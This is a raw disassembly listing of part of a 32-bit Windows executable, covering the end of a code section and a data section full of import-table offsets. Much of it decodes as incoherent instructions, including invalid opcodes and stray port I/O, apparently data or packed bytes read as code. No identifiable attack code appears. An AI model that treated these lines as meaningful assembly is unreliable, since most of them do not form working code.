  411963:	cwde   
  411964:	or     bh,BYTE PTR [ecx-0x111e33be]
  41196a:	jle    0x41195a
  41196c:	clc    
  41196d:	cmovae ebx,eax
  411970:	fist   WORD PTR [ebp-0x3b0028bc]
  411976:	aaa    
  411977:	fisub  WORD PTR [esi+0x6d]
  41197a:	test   DWORD PTR [edx+eiz*2-0x1b519792],eax
  411981:	xlat   BYTE PTR ds:[ebx]
  411982:	mov    al,ds:0x911ea34e
  411987:	test   BYTE PTR [edi-0x7918b07e],al
  41198d:	push   ebx
  41198e:	pop    ecx
  41198f:	sar    DWORD PTR [ecx-0x764debfb],1
  411995:	mov    bh,0x6d
  411997:	adc    bl,BYTE PTR ds:0x1ba4995
  41199d:	adc    ebx,DWORD PTR [esi+edx*1+0x76]
  4119a1:	mov    dl,dh
  4119a3:	ins    BYTE PTR es:[edi],dx
  4119a4:	mov    bl,0xc7
  4119a6:	mov    dl,0xf5
  4119a8:	or     eax,0x21fdf278
  4119ad:	sbb    eax,0x7e809901
  4119b2:	xchg   ebx,eax
  4119b3:	sbb    al,ch
  4119b5:	rol    DWORD PTR [ebx+esi*8],cl
  4119b8:	mov    ch,0xbb
  4119ba:	out    0xb2,al
  4119bc:	dec    ebp
  4119bd:	cmp    al,0x27
  4119bf:	(bad)  
  4119c0:	into   
  4119c1:	in     al,dx
  4119c2:	jle    0x4119de
  4119c4:	push   ecx
  4119c5:	(bad)  
  4119c6:	mov    ds:0xb93237a3,al
  4119cb:	clc    
  4119cc:	out    dx,al
  4119cd:	pop    edx
  4119ce:	pop    ecx
  4119cf:	push   ecx
  4119d0:	push   ebx
  4119d1:	jnp    0x41198f
  4119d3:	dec    DWORD PTR [ecx-0x664445bd]
  4119d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119da:	int3   
  4119db:	and    edi,0x749f0db
  4119e1:	ins    DWORD PTR es:[edi],dx
  4119e2:	xor    DWORD PTR [edi-0x79],0xd2c553f6
  4119e9:	xchg   ebp,eax
  4119ea:	mov    DWORD PTR [esi+0x2c3eee24],ebp
  4119f0:	xchg   BYTE PTR [eax],cl
  4119f2:	(bad)  
  4119f4:	jmp    0x4fa4135d
  4119f9:	xchg   ecx,eax
  4119fa:	push   ecx
  4119fb:	loopne 0x4119c0
  4119fd:	xchg   esi,eax
  4119fe:	mov    DWORD PTR [edi],0xb577072c
  411a04:	push   ebp
  411a05:	or     BYTE PTR [ecx-0x7a],0x3f
  411a09:	xor    DWORD PTR [esi-0x24cde062],ebp
  411a0f:	cmp    BYTE PTR [esi-0x76a297b],bh
  411a15:	imul   edi,DWORD PTR [edi+0x748db6b1],0x47
  411a1c:	cmp    BYTE PTR [eax+0x793cf2e2],cl
  411a22:	psllw  mm0,QWORD PTR [ebx-0x4228d1ab]
  411a29:	imul   eax,DWORD PTR [esi+0x7d],0x4be83d1
  411a30:	mov    bl,0xa5
  411a32:	xchg   edi,eax
  411a33:	lock out dx,eax
  411a35:	add    BYTE PTR [ebx+0x2df55f09],al
  411a3b:	test   DWORD PTR ds:0xa0ba7aa,0x10902c9e
  411a45:	adc    eax,DWORD PTR ds:0x75fd0c0e
  411a4b:	lock into 
  411a4d:	pop    eax
  411a4e:	clc    
  411a4f:	push   ebx
  411a50:	pusha  
  411a51:	in     eax,dx
  411a52:	jmp    0x9b23:0x58a09e3e
  411a59:	inc    ecx
  411a5a:	loopne 0x411a8a
  411a5c:	cmp    eax,0x988c8200
  411a61:	stos   BYTE PTR es:[edi],al
  411a62:	cs xchg ecx,esp
  411a65:	jmp    0x93dcf24a
  411a6a:	jp     0x4119fd
  411a6c:	idiv   BYTE PTR [edx+0x63]
  411a6f:	das    
  411a70:	adc    al,dh
  411a72:	pop    ds
  411a73:	retf   0x3171
  411a76:	push   0x2d74b8e7
  411a7b:	cmp    ah,al
  411a7d:	sub    eax,0xf8e82ec9
  411a82:	and    al,0x94
  411a84:	jbe    0x411a4e
  411a86:	inc    ebp
  411a87:	cmp    al,0xa6
  411a89:	js     0x411a50
  411a8b:	fcomip st,st(0)
  411a8d:	mov    dl,0xd3
  411a8f:	aas    
  411a90:	xor    BYTE PTR [esi+0x1d3bb584],0x63
  411a97:	xchg   edx,eax
  411a98:	add    al,0x29
  411a9a:	sahf   
  411a9b:	(bad)  
  411a9c:	in     eax,dx
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
